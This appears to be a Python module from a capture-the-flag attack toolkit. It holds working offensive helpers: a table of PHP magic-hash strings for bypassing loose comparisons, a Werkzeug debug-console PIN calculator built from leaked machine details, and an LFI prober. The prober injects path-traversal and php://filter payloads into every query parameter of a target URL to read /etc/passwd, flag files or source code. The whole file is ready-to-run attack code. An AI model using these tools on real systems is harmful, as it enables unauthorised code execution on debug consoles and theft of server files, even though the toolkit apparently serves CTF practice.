"""Web Arsenal: Werkzeug Debug PIN calculator, PHP loose comparison magic hashes, and LFI parameter prober."""
from __future__ import annotations

import hashlib
import re
from typing import Any
import urllib.parse
import urllib.request

from ..flags import scan_text


# Known PHP magic hashes (MD5 and SHA1 hashes starting with 0e followed by only digits)
PHP_MAGIC_HASHES = {
    "md5": [
        ("240610708", "0e462097431906509019562988736854"),
        ("QNKCDZO", "0e830400451993494058024219903391"),
        ("s878926199a", "0e545993274517709034328855841020"),
        ("s155964671a", "0e342768416822451524974117254469"),
        ("s214587387a", "0e848240448830532816574965044400"),
    ],
    "sha1": [
        ("aaroZmOk", "0e66507019969427134894567496984040463435"),
        ("aaK1STfY", "0e76658526655756207688271159624026011393"),
        ("aaO8zKZF", "0e89252656052527779942481212564313010213"),
    ]
}


def calculate_werkzeug_pin(
    username: str,
    modname: str = "flask.app",
    appname: str = "Flask",
    flaskpath: str = "/usr/local/lib/python3.10/site-packages/flask/app.py",
    node: int | str = 0,
    machine_id: str = "",
) -> str:
    """Calculate Werkzeug Debugger Console PIN from leaked machine attributes.
    
    Compatible with Python hashlib and Werkzeug 1.x / 2.x / 3.x algorithm.
    """
    # Normalize node to integer
    if isinstance(node, str):
        node_clean = node.replace(":", "").replace("-", "")
        try:
            node_int = int(node_clean, 16)
        except ValueError:
            node_int = 0
    else:
        node_int = int(node)

    # Convert machine_id: strip spaces
    machine_id_str = machine_id.strip()

    probably_public_bits = [
        username,
        modname,
        appname,
        flaskpath,
    ]

    private_bits = [
        str(node_int),
        machine_id_str,
    ]

    h = hashlib.sha1()
    for bit in probably_public_bits + private_bits:
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")

    num = ("%09d" % int(h.hexdigest(), 16))[:9]
    # Format as XXX-XXX-XXX
    pin = f"{num[:3]}-{num[3:6]}-{num[6:9]}"
    return pin


def probe_lfi(url: str, timeout: int = 5) -> dict[str, Any]:
    """Test URL parameters for Local File Inclusion (LFI) and path traversal."""
    flags: list[dict[str, Any]] = []
    findings: list[str] = []

    parsed = urllib.parse.urlparse(url)
    if not parsed.query:
        return {"step": "lfi-probe", "summary": "No query parameters to test for LFI", "output": "", "flags": []}

    qs = urllib.parse.parse_qs(parsed.query)
    lfi_payloads = [
        ("etc_passwd", "../../../../etc/passwd", "root:x:0:0:"),
        ("flag_direct", "../../../../flag", "flag"),
        ("flag_txt", "../../../../flag.txt", "flag"),
        ("php_filter", "php://filter/convert.base64-encode/resource=index.php", "PD9waHA"),
    ]

    for param in qs:
        for label, payload, indicator in lfi_payloads:
            test_qs = dict(qs)
            test_qs[param] = [payload]
            test_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(test_qs, doseq=True)))
            try:
                req = urllib.request.Request(test_url, headers={"User-Agent": "KRYPT/2.2"})
                with urllib.request.urlopen(req, timeout=timeout) as resp:
                    body = resp.read().decode("utf-8", "replace")
                    if indicator in body:
                        findings.append(f"[LFI] Parameter '{param}' leaked file content via '{payload}'!")
                        body_flags = scan_text(body)
                        flags.extend(body_flags)
                        break
            except Exception:
                pass

    return {
        "step": "lfi-probe",
        "summary": f"LFI / Path Traversal Prober ({len(findings)} finding(s))",
        "output": "\n".join(findings) if findings else "No immediate LFI traversal detected in query parameters.",
        "flags": flags,
    }
